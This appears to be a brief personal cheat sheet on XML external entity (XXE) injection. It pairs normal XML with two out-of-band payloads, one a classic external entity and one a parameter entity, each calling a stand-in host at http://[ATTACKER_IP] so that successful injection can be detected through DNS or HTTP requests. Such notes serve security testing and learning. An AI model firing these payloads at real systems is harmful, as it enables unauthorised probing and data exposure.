#xmli #xxe #xml

Look for DNS lookup and HTTP request to detect if injections were succefull?

# Classic
## Code
```xml
<?xml version="1.0" encoding="UTF-8"?>
<productId>1</productId>
```

## Injection
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY myVar SYSTEM "http://[ATTACKER_IP]/"> ]>
<productId>&myVar;</productId>
```


# XML Parameter (when regular entities are blocked)
## Code
```xml
<?xml version="1.0" encoding="UTF-8"?>
<productId>1</productId>
```

## Injection
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY % myParam SYSTEM "http://[ATTACKER_IP]"> %myParam; ]>
<productId>1</productId>
```